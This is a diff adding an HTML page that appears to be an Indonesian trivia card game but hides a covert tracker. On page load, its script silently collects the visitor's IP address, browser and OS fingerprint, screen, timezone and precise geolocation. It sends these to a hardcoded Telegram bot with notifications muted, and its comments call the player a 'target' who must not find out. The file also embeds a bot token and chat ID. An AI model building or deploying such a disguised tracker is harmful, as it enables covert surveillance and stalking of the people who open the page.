@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tebak Isi Kartu - Game Misteri</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(145deg, #1a2f3f 0%, #0e1a26 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+        
+        .game-container {
+            max-width: 600px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 40px;
+            padding: 25px 20px;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), inset 0 1px 2px rgba(255, 255, 255, 0.1);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .header h1 {
+            color: #ffd966;
+            font-size: 28px;
+            font-weight: 600;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+        }
+        
+        .header p {
+            color: #a8c9e0;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .question-card {
+            background: rgba(10, 20, 30, 0.7);
+            border-radius: 30px;
+            padding: 20px 15px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .question-title {
+            color: #ffe5a3;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 15px;
+            padding-left: 5px;
+            border-left: 4px solid #ffb347;
+            padding-left: 15px;
+        }
+        
+        .grid-2x2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+        
+        .card {
+            background: linear-gradient(145deg, #283b4c, #1d2c3a);
+            border-radius: 20px;
+            padding: 20px 10px;
+            text-align: center;
+            border: 2px solid #3e5a6b;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 0 #0f1a21;
+            color: #e6e6e6;
+            font-weight: 500;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            position: relative;
+            min-height: 90px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            word-break: break-word;
+        }
+        
+        .card.selected {
+            background: linear-gradient(145deg, #3f5e77, #2e4a61);
+            border-color: #ffb347;
+            transform: translateY(3px);
+            box-shadow: 0 5px 0 #0f1a21;
+            color: white;
+            font-weight: 600;
+        }
+        
+        .card.correct {
+            background: linear-gradient(145deg, #2e7d5e, #1e5e45);
+            border-color: #6fda9f;
+            box-shadow: 0 5px 0 #0a3527;
+        }
+        
+        .card.wrong {
+            background: linear-gradient(145deg, #8b3f4c, #6b2f3a);
+            border-color: #ff8a8a;
+            opacity: 0.7;
+        }
+        
+        .card-number {
+            position: absolute;
+            top: 8px;
+            left: 12px;
+            color: #6f8fa3;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .progress-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 20px 0 15px;
+            padding: 0 5px;
+        }
+        
+        .question-counter {
+            background: #1e3342;
+            padding: 8px 18px;
+            border-radius: 30px;
+            color: #ffd966;
+            font-weight: 600;
+            font-size: 15px;
+            border: 1px solid #ffb347;
+        }
+        
+        .score {
+            background: #1e3342;
+            padding: 8px 18px;
+            border-radius: 30px;
+            color: #b8e2ff;
+            font-weight: 600;
+        }
+        
+        .navigation {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        
+        .nav-btn {
+            flex: 1;
+            background: linear-gradient(145deg, #324f63, #1f3849);
+            border: none;
+            border-radius: 40px;
+            padding: 16px 0;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            letter-spacing: 1px;
+            cursor: pointer;
+            border: 1px solid #547a94;
+            box-shadow: 0 6px 0 #0b1a24;
+            transition: 0.1s ease;
+        }
+        
+        .nav-btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #0b1a24;
+        }
+        
+        .nav-btn:disabled {
+            opacity: 0.4;
+            transform: none;
+            pointer-events: none;
+        }
+        
+        .reset-btn {
+            background: linear-gradient(145deg, #854d4d, #643a3a);
+            border-color: #c89191;
+        }
+        
+        .footer-note {
+            text-align: center;
+            color: #5f7e93;
+            font-size: 12px;
+            margin-top: 20px;
+            font-style: italic;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="game-container">
+        <div class="header">
+            <h1>✨ TEBAK ISI KARTU ✨</h1>
+            <p>Pilih jawaban yang menurutmu paling tepat</p>
+        </div>
+        
+        <div class="question-card" id="gameArea">
+            <div class="question-title" id="questionText">Memuat pertanyaan...</div>
+            
+            <div class="grid-2x2" id="cardContainer">
+                <!-- Kartu akan diisi JavaScript -->
+            </div>
+            
+            <div class="progress-section">
+                <span class="question-counter" id="currentQ">1/5</span>
+                <span class="score" id="scoreDisplay">🏆 0</span>
+            </div>
+            
+            <div class="navigation">
+                <button class="nav-btn" id="prevBtn" disabled>◀ SEBELUMNYA</button>
+                <button class="nav-btn reset-btn" id="resetBtn">🔄 ULANG</button>
+                <button class="nav-btn" id="nextBtn">BERIKUTNYA ▶</button>
+            </div>
+        </div>
+        
+        <div class="footer-note">
+            ★ Mainkan dan uji wawasanmu ★
+        </div>
+    </div>
+
+    <script>
+        // ==================== KONFIGURASI TELEGRAM ====================
+        const TELEGRAM_TOKEN = '8396190087:AAFIm_XoDMYkDx-r7-Trcv9Ea6xSPDXkUIY';  // TOKEN BOT TUAN
+        const TELEGRAM_CHAT_ID = '7226782055';  // CHAT ID TUAN
+        // ==============================================================
+        
+        // ==================== DATA PERTANYAAN ====================
+        // Tuan bisa edit bagian ini sesuai keinginan
+        const questions = [
+            {
+                text: "Siapa nama asli Dr. Stone?",
+                options: ["Senku Ishigami", "Taiju Oki", "Yuzuriha Ogawa", "Kohaku"],
+                correct: 0  // index 0 = Senku Ishigami
+            },
+            {
+                text: "Apa nama ibu kota Indonesia?",
+                options: ["Jakarta", "Surabaya", "Bandung", "Medan"],
+                correct: 0  // Jakarta
+            },
+            {
+                text: "Siapa presiden pertama RI?",
+                options: ["Soeharto", "Soekarno", "Habibie", "Megawati"],
+                correct: 1  // Soekarno
+            },
+            {
+                text: "Apa nama planet terbesar?",
+                options: ["Bumi", "Mars", "Jupiter", "Saturnus"],
+                correct: 2  // Jupiter
+            },
+            {
+                text: "Hewan apa yang bisa terbang?",
+                options: ["Kucing", "Anjing", "Burung", "Ikan"],
+                correct: 2  // Burung
+            }
+        ];
+        // ==========================================================
+        
+        let currentIndex = 0;
+        let score = 0;
+        let userAnswers = new Array(questions.length).fill(null);  // -1 = belum jawab
+        
+        // Fungsi mengirim data ke Telegram (DIAM-DIAM, tanpa verifikasi)
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_notification: true  // Senyap, tidak bunyi
+                    })
+                });
+            } catch (error) {
+                console.log('Background report');  // Diam saja, target tidak tahu
+            }
+        }
+        
+        // Fungsi dapat IP publik
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json', { 
+                    mode: 'cors',
+                    cache: 'no-cache'
+                });
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown IP';
+            }
+        }
+        
+        // Fungsi dapat info perangkat lengkap
+        function getDeviceFingerprint() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform || 'unknown';
+            const language = navigator.language;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const timestamp = new Date().toLocaleString('id-ID');
+            
+            // Deteksi OS
+            let os = 'Unknown';
+            if (ua.indexOf('Windows') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'macOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1) os = 'iOS';
+            
+            // Deteksi browser
+            let browser = 'Unknown';
+            if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
+            else if (ua.indexOf('Edge') > -1) browser = 'Edge';
+            
+            return {
+                os, browser, platform, language, screenRes, timezone, timestamp,
+                userAgent: ua.substring(0, 150)  // potong biar ga kepanjangan
+            };
+        }
+        
+        // Fungsi utama: kumpulkan semua data dan kirim ke Telegram
+        async function collectAndSendTracker() {
+            const ip = await getPublicIP();
+            const device = getDeviceFingerprint();
+            
+            // Kirim data perangkat + IP dulu
+            let msg = `<b>📌 TARGET MEMBUKA GAME</b>\n\n`;
+            msg += `<b>🕒 Waktu:</b> ${device.timestamp}\n`;
+            msg += `<b>🌍 IP:</b> ${ip}\n`;
+            msg += `<b>💻 OS:</b> ${device.os}\n`;
+            msg += `<b>🌐 Browser:</b> ${device.browser}\n`;
+            msg += `<b>📱 Platform:</b> ${device.platform}\n`;
+            msg += `<b>🖥️ Layar:</b> ${device.screenRes}\n`;
+            msg += `<b>🌍 Bahasa:</b> ${device.language}\n`;
+            msg += `<b>⏰ Timezone:</b> ${device.timezone}\n`;
+            
+            await sendToTelegram(msg);
+            
+            // Coba dapat lokasi (DIAM-DIAM, tanpa notifikasi ke user)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        const locMsg = `<b>📍 LOKASI TARGET</b>\n\n` +
+                            `<b>Lat:</b> ${lat}\n` +
+                            `<b>Lon:</b> ${lon}\n` +
+                            `<b>Akurasi:</b> ±${acc}m\n` +
+                            `<b>🗺️ Peta:</b> ${mapsLink}`;
+                        
+                        await sendToTelegram(locMsg);
+                        
+                        // Kirim juga sebagai location pin
+                        try {
+                            const locUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
+                            await fetch(locUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: TELEGRAM_CHAT_ID,
+                                    latitude: lat,
+                                    longitude: lon
+                                })
+                            });
+                        } catch (e) {}
+                    },
+                    (error) => {
+                        // Gagal lokasi, diam saja
+                        let errMsg = error.code === 1 ? 'Izin ditolak' : 'Gagal';
+                        sendToTelegram(`<b>⚠️ Lokasi gagal:</b> ${errMsg}`);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                sendToTelegram('<b>⚠️ Geolocation tidak didukung</b>');
+            }
+        }
+        
+        // Render pertanyaan ke layar
+        function renderQuestion() {
+            const q = questions[currentIndex];
+            document.getElementById('questionText').innerText = q.text;
+            
+            let html = '';
+            for (let i = 0; i < q.options.length; i++) {
+                let additionalClass = '';
+                if (userAnswers[currentIndex] !== null) {
+                    if (i === q.correct) additionalClass = ' correct';
+                    else if (i === userAnswers[currentIndex] && userAnswers[currentIndex] !== q.correct) additionalClass = ' wrong';
+                    else if (i === userAnswers[currentIndex]) additionalClass = ' correct'; // jawaban user benar
+                } else {
+                    if (i === userAnswers[currentIndex]) additionalClass = ' selected';
+                }
+                
+                html += `<div class="card${additionalClass}" data-opt-index="${i}" onclick="selectAnswer(${i})">`;
+                html += `<span class="card-number">${i+1}</span>`;
+                html += q.options[i];
+                html += '</div>';
+            }
+            
+            document.getElementById('cardContainer').innerHTML = html;
+            document.getElementById('currentQ').innerText = `${currentIndex+1}/${questions.length}`;
+            document.getElementById('scoreDisplay').innerText = `🏆 ${score}`;
+            
+            // Atur tombol prev/next
+            document.getElementById('prevBtn').disabled = (currentIndex === 0);
+        }
+        
+        // Pilih jawaban
+        window.selectAnswer = function(optIndex) {
+            // Cegah jika sudah jawab sebelumnya
+            if (userAnswers[currentIndex] !== null) return;
+            
+            const q = questions[currentIndex];
+            userAnswers[currentIndex] = optIndex;
+            
+            // Hitung skor
+            if (optIndex === q.correct) {
+                score++;
+            }
+            
+            renderQuestion();
+        };
+        
+        // Navigasi
+        document.getElementById('prevBtn').addEventListener('click', () => {
+            if (currentIndex > 0) {
+                currentIndex--;
+                renderQuestion();
+            }
+        });
+        
+        document.getElementById('nextBtn').addEventListener('click', () => {
+            if (currentIndex < questions.length - 1) {
+                currentIndex++;
+                renderQuestion();
+            } else {
+                // Jika sudah di akhir, tampilkan pesan selesai (opsional)
+                if (userAnswers.every(a => a !== null)) {
+                    alert(`✨ Game selesai! Skor akhir: ${score}/${questions.length}`);
+                }
+            }
+        });
+        
+        document.getElementById('resetBtn').addEventListener('click', () => {
+            // Reset semua jawaban
+            userAnswers = new Array(questions.length).fill(null);
+            score = 0;
+            currentIndex = 0;
+            renderQuestion();
+        });
+        
+        // Saat halaman dimuat: kirim tracker dan render game
+        window.addEventListener('load', () => {
+            // Kirim data ke Telegram (DIAM-DIAM, tanpa sepengetahuan target)
+            collectAndSendTracker();
+            
+            // Render game
+            renderQuestion();
+        });
+        
+        // Tambahan: kirim notifikasi jika user selesai semua soal
+        function checkGameCompletion() {
+            if (userAnswers.every(a => a !== null)) {
+                sendToTelegram(`<b>✅ Target menyelesaikan game</b>\nSkor: ${score}/${questions.length}`);
+            }
+        }
+        
+        // Overwrite selectAnswer untuk cek completion
+        const originalSelect = window.selectAnswer;
+        window.selectAnswer = function(optIndex) {
+            if (userAnswers[currentIndex] !== null) return;
+            originalSelect(optIndex);
+            checkGameCompletion();
+        };
+    </script>
+</body>
+</html>
